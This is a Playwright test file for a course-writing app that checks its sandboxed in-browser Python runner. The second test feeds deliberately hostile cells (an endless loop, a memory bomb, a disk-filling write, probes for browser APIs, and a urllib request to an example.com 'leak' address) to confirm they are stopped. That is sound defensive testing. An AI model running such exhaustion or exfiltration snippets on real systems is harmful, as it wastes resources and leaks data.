import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { ASM_SCRIPT, classicAsm } from '@folio/run';
import { expect, test } from './fixtures';
import { fakeAnthropic } from './fakeModel';
import { withKey } from './helpers';

/** The interpreter's own files, from the installed package: enough for Python without libraries. */
const RUNTIME = join(import.meta.dirname, '../../../packages/run/node_modules/pyodide');
const TYPES: Record<string, string> = { wasm: 'application/wasm', json: 'application/json', zip: 'application/zip' };

test('the Python on a week’s page is run in the browser, shut in, and the page shows what it really prints', async ({ page }) => {
  test.setTimeout(120_000);
  await withKey(page);
  const fetched: string[] = [];
  await page.route('**/api/runtime/**', (route) => {
    const name = route.request().url().split('/').pop()!;
    fetched.push(name);
    // The interpreter's script is served as the runtime folder holds it: turned into a plain script.
    if (name === ASM_SCRIPT) return route.fulfill({ body: classicAsm(readFileSync(join(RUNTIME, 'pyodide.asm.mjs'), 'utf8')), contentType: 'text/javascript' });
    return route.fulfill({ body: readFileSync(join(RUNTIME, name)), contentType: TYPES[name.split('.').pop()!] });
  });
  // What the page and the runner's frame say, kept for when the run does not happen: the reason is only there.
  const said: string[] = [];
  page.on('console', (m) => said.push(`${m.type()}: ${m.text().slice(0, 500)}`));
  const model = await fakeAnthropic(page, { delayMs: 20, python: true });
  await page.goto('/');
  await page.getByLabel('Describe your course').fill('Photosynthesis for first-year undergraduates: an asynchronous online course, three weeks');
  await page.getByRole('button', { name: 'Continue' }).click();
  await page.getByRole('button', { name: /^Write 3/ }).click();
  await expect(page.getByText(/Course ready/)).toBeVisible({ timeout: 90_000 });

  // The writer said 44; the code prints 45, and that is what the page shows.
  await page.getByRole('link', { name: /Light and leaves/ }).first().click();
  await expect(page.getByText('The total is 45'), said.join('\n')).toBeVisible();
  await expect(page.getByText('The total is 44')).toHaveCount(0);
  // The reader of each page was told the outputs are real.
  expect(model.calls.filter((c) => c.messages[0]!.content.includes('holds what it really printed'))).toHaveLength(3);

  // Where it ran: a frame that may run scripts and nothing else, with a policy that forbids every connection.
  const frame = page.locator('iframe[src="/runner/"]');
  await expect(frame).toHaveAttribute('sandbox', 'allow-scripts');
  const policy = (await page.request.get('/runner/')).headers()['content-security-policy']!;
  expect(policy).toContain("connect-src 'none'");
  expect(policy).not.toContain("'self'; script-src 'self'");
  // The interpreter was fetched once by Folio's own page and handed in: three weeks, three notebooks, one download.
  expect(fetched.sort()).toEqual(['pyodide-lock.json', ASM_SCRIPT, 'pyodide.asm.wasm', 'python_stdlib.zip'].sort());
});

/** Talk to the runner's frame as Folio's page does, one cell after another, and give back each result. */
async function runInFrame(page: import('@playwright/test').Page, cells: { code: string; cellMs?: number }[]): Promise<{ error?: { type: string; message: string }; stdout?: string; sessionLost?: boolean }[]> {
  return page.evaluate(async (cells) => {
    const frame = document.createElement('iframe');
    frame.setAttribute('sandbox', 'allow-scripts');
    frame.hidden = true;
    frame.src = '/runner/';
    const results: unknown[] = [];
    let next = 0;
    const send = (m: unknown, transfer: Transferable[] = []) => frame.contentWindow!.postMessage(m, '*', transfer);
    const run = () => send({ t: 'run', id: next + 1, cell: { code: cells[next]!.code }, cellMs: cells[next]!.cellMs ?? 20000, loadMs: 60000 });
    const done = new Promise<void>((resolve) => {
      window.addEventListener('message', async (e) => {
        if (e.source !== frame.contentWindow) return;
        const m = e.data as { t: string; rid: number; name: string; id: number; res: unknown };
        if (m.t === 'hello') send({ t: 'init', options: { limits: { maxOut: 2000, maxFigures: 2, maxPngBytes: 1e6, maxPngSide: 4096, maxTraceback: 2000 }, harden: { maxHeapMB: 256, fileQuotaMB: 8 } } });
        else if (m.t === 'need') {
          const buf = await (await fetch(`/api/runtime/pyodide-314.0.7/${m.name}`)).arrayBuffer();
          send({ t: 'file', rid: m.rid, buf }, [buf]);
        } else if (m.t === 'ready' && next === 0 && !results.length) run();
        else if (m.t === 'result') {
          results.push(m.res);
          next += 1;
          if (next === cells.length) resolve();
          else run();
        }
      });
    });
    document.body.appendChild(frame);
    await done;
    frame.remove();
    return results as never;
  }, cells);
}

test('course code that never ends, takes all the memory or reaches for the network is stopped, and the next cell runs', async ({ page }) => {
  test.setTimeout(120_000);
  const asked: string[] = [];
  await page.route('**/api/runtime/**', (route) => {
    const name = route.request().url().split('/').pop()!;
    if (name === ASM_SCRIPT) return route.fulfill({ body: classicAsm(readFileSync(join(RUNTIME, 'pyodide.asm.mjs'), 'utf8')), contentType: 'text/javascript' });
    return route.fulfill({ body: readFileSync(join(RUNTIME, name)), contentType: TYPES[name.split('.').pop()!] });
  });
  page.on('request', (r) => asked.push(r.url()));
  await page.goto('/');
  const [kept, forever, after, memory, afterMemory, files, js, net, flood] = await runInFrame(page, [
    { code: 'kept = 41\nprint(kept + 1)' },
    { code: 'while True:\n    pass', cellMs: 2500 },
    { code: 'print("kept" in dir())' },
    { code: 'blocks = []\nwhile True:\n    blocks.append(bytearray(32_000_000))' },
    { code: 'print(6 * 7)' },
    { code: 'with open("big.bin", "wb") as f:\n    for _ in range(64):\n        f.write(bytes(1_000_000))' },
    { code: 'import js\nprint([hasattr(js, n) for n in ("fetch", "localStorage", "indexedDB", "document", "self", "postMessage", "importScripts", "XMLHttpRequest")])' },
    { code: 'import urllib.request\nurllib.request.urlopen("https://example.com/leak?x=1")' },
    { code: 'print("x" * 5_000_000)' },
  ]);
  expect(kept).toMatchObject({ stdout: '42\n' });
  // A cell that never ends is ended with its notebook, and the next cell starts in a new one.
  expect(forever).toMatchObject({ error: { type: 'TimeoutError' }, sessionLost: true });
  expect(after).toMatchObject({ stdout: 'False\n' });
  // Memory and files have a ceiling; past it Python gets an error of its own, and the runner goes on.
  expect(memory!.error!.type).toBe('MemoryError');
  expect(afterMemory).toMatchObject({ stdout: '42\n' });
  expect(files!.error!.type).toBe('OSError');
  // Python is handed none of the browser, and the frame's policy lets no request out.
  expect(js).toMatchObject({ stdout: `[${Array(8).fill('False').join(', ')}]\n` });
  expect(net!.error).toBeTruthy();
  expect(flood!.stdout!.length).toBe(2000);
  // Nothing left for the address the code asked for: the frame's policy lets no request out.
  expect(asked.filter((u) => u.includes('example.com'))).toEqual([]);
});
